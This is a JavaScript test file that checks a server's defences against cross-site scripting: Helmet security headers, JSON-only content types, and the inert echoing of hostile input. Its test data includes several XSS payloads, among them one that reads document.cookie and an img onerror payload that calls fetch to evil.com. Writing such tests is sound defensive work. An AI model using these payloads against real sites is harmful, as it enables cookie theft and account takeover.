/**
 * This test file checks the server's defences against Cross-Site Scripting (XSS) attacks.
 * It tests:
 * - That Helmet security headers are present on all API responses
 *   (X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, HSTS, etc.)
 * - That the Content-Security-Policy does NOT contain unsafe-inline or unsafe-eval
 * - That all API responses use application/json, never text/html
 * - That XSS payloads sent in request bodies are returned as inert JSON strings
 *
 */
import {
  describe, it, expect, beforeEach,
} from "vitest";
import request from "supertest";
import express from "express";
import helmet from "helmet";
import { join, resolve, dirname } from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// ─── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Build a test app that mirrors the Helmet configuration used in
 * server/index.js — same options, same disabled policies.
 */
function makeHelmetApp() {
  const app = express();
  app.use(helmet({
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: false,
  }));
  app.use(express.json());
  // A plain JSON endpoint (mimics any Chartbrew API route)
  app.get("/api/data", (req, res) => res.json({ value: "hello" }));
  // An endpoint that echoes back user-supplied input in JSON
  app.post("/api/echo", (req, res) => res.json({ received: req.body }));
  // A 404 handler that returns JSON (not HTML)
  app.use((req, res) => res.status(404).json({ message: "Not Found" }));
  return app;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. Helmet header presence
// ═══════════════════════════════════════════════════════════════════════════════
describe("XSS Prevention — Helmet security headers", () => {
  let app;

  beforeEach(() => {
    app = makeHelmetApp();
  });

  it("sets X-Content-Type-Options: nosniff", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["x-content-type-options"]).toBe("nosniff");
  });

  it("sets X-DNS-Prefetch-Control: off", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["x-dns-prefetch-control"]).toBe("off");
  });

  it("sets X-Download-Options: noopen", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["x-download-options"]).toBe("noopen");
  });

  it("sets Referrer-Policy", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["referrer-policy"]).toBeTruthy();
  });

  it("sets X-Permitted-Cross-Domain-Policies: none", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["x-permitted-cross-domain-policies"]).toBe("none");
  });

  it("sets X-Frame-Options (anti-clickjacking)", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["x-frame-options"]).toMatch(/SAMEORIGIN|DENY/i);
  });

  it("sets Content-Security-Policy", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["content-security-policy"]).toBeTruthy();
  });

  it("sets Strict-Transport-Security (HSTS)", async () => {
    const res = await request(app).get("/api/data");
    // HSTS prevents protocol-downgrade attacks that can enable XSS
    expect(res.headers["strict-transport-security"]).toBeTruthy();
  });

  it("does not expose the X-Powered-By: Express header", async () => {
    const res = await request(app).get("/api/data");
    // Helmet removes this header to prevent technology fingerprinting
    expect(res.headers["x-powered-by"]).toBeUndefined();
  });

  it("security headers are present on 404 responses too", async () => {
    const res = await request(app).get("/nonexistent-route");
    expect(res.status).toBe(404);
    expect(res.headers["x-content-type-options"]).toBe("nosniff");
    expect(res.headers["x-frame-options"]).toBeTruthy();
  });

  it("security headers are present on POST responses", async () => {
    const res = await request(app)
      .post("/api/echo")
      .send({ name: "test" });
    expect(res.status).toBe(200);
    expect(res.headers["x-content-type-options"]).toBe("nosniff");
    expect(res.headers["x-frame-options"]).toBeTruthy();
  });
});

describe("XSS Prevention — Content-Type: application/json enforcement", () => {
  let app;

  beforeEach(() => {
    app = makeHelmetApp();
  });

  it("API success response has application/json content-type", async () => {
    const res = await request(app).get("/api/data");
    expect(res.headers["content-type"]).toMatch(/application\/json/);
  });

  it("API 404 response has application/json content-type, not text/html", async () => {
    const res = await request(app).get("/does-not-exist");
    expect(res.status).toBe(404);
    expect(res.headers["content-type"]).toMatch(/application\/json/);
    expect(res.headers["content-type"]).not.toMatch(/text\/html/);
  });

  it("POST echo endpoint responds with application/json", async () => {
    const res = await request(app)
      .post("/api/echo")
      .send({ value: "<script>alert(1)</script>" });
    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/application\/json/);
  });

  it("XSS payload in body is returned as an inert JSON string", async () => {
    const payload = "<script>alert(document.cookie)</script>";
    const res = await request(app)
      .post("/api/echo")
      .send({ name: payload });
    expect(res.status).toBe(200);
    expect(res.body.received.name).toBe(payload);
    expect(res.headers["content-type"]).toMatch(/application\/json/);
  });

  it("various XSS payloads in request body are round-tripped as JSON strings without server error", async () => {
    // These checks confirm the server stays stable when receiving hostile input.
    // They do NOT prove browser-level XSS prevention — that is covered by
    // the nosniff + JSON Content-Type headers and React's DOM rendering.
    const payloads = [
      { name: "<img src=x onerror=fetch('http://evil.com')>" },
      // eslint-disable-next-line no-script-url
      { name: "javascript:alert(1)" },
      { name: "<svg/onload=alert(1)>" },
      { name: "';alert(1)//" },
    ];
    for (const body of payloads) {
      // eslint-disable-next-line no-await-in-loop
      const res = await request(app).post("/api/echo").send(body);
      expect(res.status).toBe(200);
      expect(res.body.received.name).toBe(body.name);
    }
  });
});
